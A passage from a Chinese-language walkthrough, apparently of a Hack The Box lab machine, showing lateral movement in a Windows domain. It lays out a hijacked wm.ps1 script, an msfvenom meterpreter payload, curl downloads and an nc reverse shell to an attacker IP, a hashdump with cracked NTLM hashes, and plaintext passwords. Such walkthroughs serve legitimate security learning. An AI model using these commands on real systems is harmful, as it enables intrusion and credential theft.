Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Get-Content</span>                                        <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Get-Location</span>                                       <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Set-Content</span>                                        <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Set-Location</span>                                       <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Write-Output</span>                                       <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br></pre></td></tr></table></figure>

<p>至少读、列出文件、创建文件之类的时ok的，所以看下<code>imonks</code>的<code>~/desktop</code>，其中包含一个user flag和一个<code>wm.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> atsserver <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> ~/desktop&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> atsserver <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> ~/desktop&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\imonks\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                               <span class="literal">--------------</span>                    </span><br><span class="line"><span class="literal">-ar---</span>        <span class="number">10</span>/<span class="number">03</span>/<span class="number">2025</span>     <span class="number">00</span>:<span class="number">57</span>             <span class="number">34</span> user.txt                           atsserver                         </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">01</span>/<span class="number">2022</span>     <span class="number">18</span>:<span class="number">04</span>            <span class="number">602</span> wm.ps1                             atsserver </span><br></pre></td></tr></table></figure>

<p>这里能看到他是又以<code>jmorgan</code>用户来invoke-command执行调用<code>Acute-PC01</code>主机的<code>Get-Volume</code>命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> atsserver <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">cat</span> ~/desktop/wm.ps1&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$securepasswd</span> = <span class="string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span></span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$securepasswd</span> | <span class="built_in">ConvertTo-SecureString</span></span><br><span class="line"><span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="string">&quot;acute\jmorgan&quot;</span>, <span class="variable">$passwd</span>)</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">Get-Volume</span>&#125; <span class="literal">-ComputerName</span> Acute<span class="literal">-PC01</span> <span class="literal">-Credential</span> <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>

<h2 id="to-jmorgan"><a href="#to-jmorgan" class="headerlink" title="to jmorgan"></a>to jmorgan</h2><p>这不同于当前<code>imonks</code>是在<code>atsserver</code>执行命令,这个<code>wm.ps1</code>脚本是在<code>atsserver</code>上，但是执行的调用却回<code>Acute-PC01</code>去了，笑了</p>
<p>这里打算拿他那这个密码去执行命令，然后转换时候报了<code>ConvertTo-SecureString : Key not valid for use in specified state.</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Utils&gt; $securepasswd = &#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><span class="line">$securepasswd = &#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><span class="line">PS C:\Utils&gt; $passwd = $securepasswd | ConvertTo-SecureString</span><br><span class="line">$passwd = $securepasswd | ConvertTo-SecureString</span><br><span class="line">ConvertTo-SecureString : Key not valid for use in specified state.</span><br><span class="line">At line:1 char:27</span><br><span class="line">+ $passwd = $securepasswd | ConvertTo-SecureString</span><br><span class="line">+                           ~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : InvalidArgument: (:) [ConvertTo-SecureString], CryptographicException</span><br><span class="line">    + FullyQualifiedErrorId : ImportSecureString_InvalidArgument_CryptographicError,Microsoft.PowerShell.Commands.Conv </span><br><span class="line">   ertToSecureStringCommand</span><br></pre></td></tr></table></figure>

<p>找到了这篇文章</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/answers/questions/2102987/key-not-valid-for-use-in-specified-state">https://learn.microsoft.com/en-us/answers/questions/2102987/key-not-valid-for-use-in-specified-state</a></p>
</blockquote>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-14.png" alt="alt text"></p>
<p>其中提到，<code>如果安全字符串是由其他用户加密的，或者在与尝试解密它不同的计算机上加密的</code>，就会这样。</p>
<p>所以还是需要用<code>imonks</code>在对面<code>atsserver</code>做这个操作才可以</p>
<p>然后又报错了,因为<code>dc_manage</code>限制的存在，没命令执行权限直接。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$securepasswd</span> = <span class="string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span>;<span class="variable">$passwd</span> = <span class="variable">$securepasswd</span> | <span class="built_in">ConvertTo-SecureString</span>;<span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\jmorgan&quot;</span>, <span class="variable">$passwd</span>);<span class="built_in">Invoke-Command</span> <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">Get-Volume</span>&#125; <span class="literal">-ComputerName</span> Acute<span class="literal">-PC01</span> <span class="literal">-Credential</span> <span class="variable">$creds</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$securepasswd</span> = <span class="string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span>;<span class="variable">$passwd</span> = <span class="variable">$securepasswd</span> | <span class="built_in">ConvertTo-SecureString</span>;<span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\jmorgan&quot;</span>, <span class="variable">$passwd</span>);<span class="built_in">Invoke-Command</span> <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">Get-Volume</span>&#125; <span class="literal">-ComputerName</span> Acute<span class="literal">-PC01</span> <span class="literal">-Credential</span> <span class="variable">$creds</span>&#125;</span><br><span class="line">The term <span class="string">&#x27;ConvertTo-SecureString&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable </span><br><span class="line">program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and <span class="keyword">try</span> again.</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (<span class="built_in">ConvertTo-SecureString</span>:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br><span class="line"> </span><br><span class="line">The term <span class="string">&#x27;New-Object&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable program. Check the </span><br><span class="line">spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and <span class="keyword">try</span> again.</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (<span class="built_in">New-Object</span>:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br><span class="line"> </span><br><span class="line">The term <span class="string">&#x27;Invoke-Command&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable program. Check </span><br><span class="line">the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and <span class="keyword">try</span> again.</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (<span class="built_in">Invoke-Command</span>:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br></pre></td></tr></table></figure>

<p>虽然限制了比较多，但是试了下直接执行<code>wm.ps1</code>却可以的</p>
<p>那就简单，只需要修改掉wm.ps1中的<code>Get-Volume</code>，再执行<code>wm.ps1</code>从而相当于让<code>jmorgan</code>执行恶意载荷就可以.</p>
<p>再生成一个载荷，这个个人习惯问题，不太喜欢俩载荷用都走同一个端口，因为sessions时候第一眼习惯看端口区分（x.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=10089 -f exe -o a.exe</span><br><span class="line">Warning: KRB5CCNAME environment variable not supported - unsetting</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: a.exe</span><br></pre></td></tr></table></figure>

<p>改一下监听，后台运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 10089</span><br><span class="line">LPORT =&gt; 10089</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.4:10089 </span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/handler) &gt; </span><br></pre></td></tr></table></figure>

<p>这里用<code>edavies</code>的shell把载荷先丢进去</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/a.exe <span class="literal">-o</span> C:/utils/t.exe</span><br></pre></td></tr></table></figure>

<p>然后修改<code>atsserver</code>上<code>imonks</code>的<code>wm.ps1</code>脚本内容，用<code>C:\Utils\t.exe</code>替换<code>Get-Volume</code>,使得执行<code>wm.ps1</code>时直接执行msf载荷</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="literal">-AsplainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\imonks&quot;</span>,<span class="variable">$passwd</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; (<span class="built_in">Get-Content</span> <span class="literal">-Path</span> ~/desktop/wm.ps1).Replace(<span class="string">&#x27;Get-Volume&#x27;</span>, <span class="string">&#x27;C:\Utils\t.exe&#x27;</span>) | <span class="built_in">Set-Content</span> <span class="literal">-Path</span> ~/desktop/wm.ps1 &#125;</span><br></pre></td></tr></table></figure>

<p>然后这里有点怪，执行了<code>wm.ps1</code>msf却收不到客户端连接。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; C:/Utils/wm.ps1 &#125;</span><br></pre></td></tr></table></figure>

<p>然后又重启了下机器，丢了个nc上去</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/nc64.exe <span class="literal">-o</span> C:/Utils/b.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; (<span class="built_in">Get-Content</span> <span class="literal">-Path</span> C:\Users\imonks\desktop\wm.ps1).Replace(<span class="string">&#x27;Get-Volume&#x27;</span>,<span class="string">&#x27;C:\Utils\a.exe 10.10.16.4 10088 -e powershell&#x27;</span>)| <span class="built_in">Set-Content</span> <span class="literal">-Path</span> C:\Users\imonks\desktop\wm.ps1&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; C:\Users\imonks\desktop\wm.ps1 &#125;</span><br></pre></td></tr></table></figure>

<p>反而能收到shell,奇怪呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">─$ nc -lvnp 10088  </span><br><span class="line">listening on [any] 10088 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.11.145] 49840</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Try the new cross-platform PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\jmorgan\Documents&gt; </span><br><span class="line">PS C:\Users\jmorgan\Documents&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">acute\jmorgan</span><br></pre></td></tr></table></figure>

<p>查看当前用户权限，是主机<code>administrators</code>组里的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\administrator.ACUTE\downloads&gt; whoami /all</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name     SID</span><br><span class="line">============= ==============================================</span><br><span class="line">acute\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID          Attributes</span><br><span class="line">========================================== ================ ============ ===============================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                            Description                                                        State</span><br><span class="line">========================================= ================================================================== =======</span><br><span class="line">SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled</span><br><span class="line">SeSecurityPrivilege                       Manage auditing and security log                                   Enabled</span><br><span class="line">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled</span><br><span class="line">SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled</span><br><span class="line">SeSystemProfilePrivilege                  Profile system performance                                         Enabled</span><br><span class="line">SeSystemtimePrivilege                     Change the system time                                             Enabled</span><br><span class="line">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled</span><br><span class="line">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled</span><br><span class="line">SeBackupPrivilege                         Back up files and directories                                      Enabled</span><br><span class="line">SeRestorePrivilege                        Restore files and directories                                      Enabled</span><br><span class="line">SeShutdownPrivilege                       Shut down the system                                               Enabled</span><br><span class="line">SeDebugPrivilege                          Debug programs                                                     Enabled</span><br><span class="line">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled</span><br><span class="line">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled</span><br><span class="line">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled</span><br><span class="line">SeUndockPrivilege                         Remove computer from docking station                               Enabled</span><br><span class="line">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled</span><br><span class="line">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled</span><br><span class="line">SeCreateGlobalPrivilege                   Create global objects                                              Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled</span><br><span class="line">SeTimeZonePrivilege                       Change the time zone                                               Enabled</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br></pre></td></tr></table></figure>

<p>用nc这个执行刚才的<code>msf</code>载荷弹个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; start-job -scriptblock &#123;C:\utils\t.exe&#125;</span><br><span class="line">start-job -scriptblock &#123;C:\utils\t.exe&#125;</span><br><span class="line"></span><br><span class="line">Id     Name            PSJobTypeName   State         HasMoreData     Location             Command                  </span><br><span class="line">--     ----            -------------   -----         -----------     --------             -------                  </span><br><span class="line">1      Job1            BackgroundJob   Running       True            localhost            C:\utils\t.exe  </span><br></pre></td></tr></table></figure>

<p>这次接到shell了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  55        meterpreter x64/windows  ACUTE\edavies @ ACUTE-PC01  10.10.16.4:10087 -&gt; 10.10.11.145:49877 (172.16.22.2)</span><br><span class="line">  56        meterpreter x64/windows  ACUTE\jmorgan @ ACUTE-PC01  10.10.16.4:10089 -&gt; 10.10.11.145:49792 (172.16.22.2)</span><br></pre></td></tr></table></figure>

<h2 id="to-awallace"><a href="#to-awallace" class="headerlink" title="to awallace"></a>to awallace</h2><p>这里搜了一圈jmorgan用户上没有任何有价值的东西，切终端抓hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;sessions 56</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::</span><br></pre></td></tr></table></figure>

<p>拖去跑密码，得到一个弱口令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ hashcat hash /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting in autodetect mode    </span><br><span class="line">                                                </span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">                                                                                                 </span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line">                                                </span><br><span class="line">1000 | NTLM | Operating System</span><br><span class="line"></span><br><span class="line">a29f7623fd11550def0192de9246f46b:Password@123 </span><br></pre></td></tr></table></figure>

<p>获取当前域内用户，需要在域控上执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net users /domain&#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net users /domain&#125;</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            awallace                 chall                    </span><br><span class="line">edavies                  Guest                    imonks                   </span><br><span class="line">jmorgan                  krbtgt                   lhopkins                 </span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>

<p>这里想直接对着172.16.22.1喷密码，所以加一下路由先</p>
